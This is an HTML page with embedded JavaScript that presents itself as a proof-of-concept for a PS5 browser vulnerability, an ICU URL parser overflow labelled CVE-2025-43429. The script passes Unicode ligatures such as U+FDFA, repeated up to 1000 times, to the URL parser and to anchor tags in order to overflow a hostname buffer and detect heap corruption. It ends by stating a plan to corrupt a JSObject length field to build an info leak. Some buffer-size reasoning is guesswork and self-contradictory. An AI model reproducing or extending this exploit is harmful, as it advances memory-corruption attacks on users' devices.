<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 CVE-2025-43429 - ICU URL Parser Overflow</title>
</head>
<body>
<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };

L('[*] Starting CVE-2025-43429 ICU URL Parser Overflow test...');

// Characters that expand massively during IDNA normalization (Unicode to ASCII Punycode)
// \uFDFA expands to ~18 characters
// \u212B expands to "A" + combining ring
// \uFB01 expands to "fi"

const expanders = [
    '\uFDFA', // ARABIC LIGATURE SALLALLAHOU ALAYHE WASALLAM
    '\u212B', // ANGSTROM SIGN
    '\uFB01', // LATIN SMALL LIGATURE FI
    '\uFB03', // LATIN SMALL LIGATURE FFI
    '\u3371', // SQUARE HPA
    '\uFB00', // LATIN SMALL LIGATURE FF
];

// Test 1: Direct URL constructor with expanding characters
L('\n--- Test 1: URL Constructor with expanding domain ---');
for (let i = 0; i < expanders.length; i++) {
    try {
        // Build a domain like: http://[expander x100].com
        let domain = expanders[i].repeat(100) + '.com';
        let url = new URL('http://' + domain);
        
        // If we reach here without crashing, check if the hostname was truncated or corrupted
        L('[+] Expander ' + i + ': URL parsed. Hostname length: ' + url.hostname.length);
        
        // Check for memory corruption in the hostname string
        let anomalous = false;
        for (let j = 0; j < url.hostname.length; j++) {
            let code = url.hostname.charCodeAt(j);
            // Punycode starts with xn--
            // If we see non-ASCII or control chars, memory is corrupted
            if (code > 127 || (code < 32 && code !== 45)) { // 45 is '-'
                L('[!] ANOMALY at index ' + j + ': 0x' + code.toString(16));
                anomalous = true;
                break;
            }
        }
        if (anomalous) {
            L('[!] Hostname contains corrupted data! Possible heap leak!');
            L('[!] Hostname: ' + url.hostname);
        }
    } catch (e) {
        L('[!] Expander ' + i + ' threw: ' + e.message);
    }
}

// Test 2: Massive expansion to guarantee overflow
L('\n--- Test 2: Massive Expansion (1000x) ---');
try {
    // \uFDFA repeats 1000 times -> expands to ~18000 chars
    // If hostnameBuffer is only 1024 bytes, this will overflow by 17000 bytes
    let domain = '\uFDFA'.repeat(1000) + '.com';
    let url = new URL('http://' + domain);
    L('[+] Massive URL parsed. Hostname length: ' + url.hostname.length);
    L('[+] Hostname (first 100 chars): ' + url.hostname.substring(0, 100));
} catch (e) {
    L('[!] Massive test threw: ' + e.message);
}

// Test 3: Anchor element href parsing (different code path)
L('\n--- Test 3: Anchor href parsing ---');
try {
    const a = document.createElement('a');
    a.href = 'http://' + '\uFDFA'.repeat(500) + '.com';
    
    // Force layout/style resolution to trigger the parser
    void a.offsetWidth;
    
    L('[+] Anchor href parsed. Hostname length: ' + a.hostname.length);
    L('[+] Hostname: ' + a.hostname.substring(0, 100));
} catch (e) {
    L('[!] Anchor test threw: ' + e.message);
}

// Test 4: Mixed expanders to hit boundary conditions exactly
L('\n--- Test 4: Boundary Condition (64 bytes) ---');
try {
    // Try to hit the exact buffer size (e.g., 256 bytes)
    // \uFDFA expands to 18 bytes. 256 / 18 ≈ 14.
    // 14 * \uFDFA = 14 chars input -> 252 bytes output. 
    // Add a few normal chars to push it over 256.
    let domain = '\uFDFA'.repeat(15) + 'aaaa.com';
    let url = new URL('http://' + domain);
    L('[+] Boundary URL parsed. Hostname length: ' + url.hostname.length);
} catch (e) {
    L('[!] Boundary test threw: ' + e.message);
}

L('\n[*] If the browser did not crash, the overflow might be silently corrupting heap memory.');
L('[*] We can use this to corrupt a JSObject length field to build an info leak!');
</script>
</body>
</html>
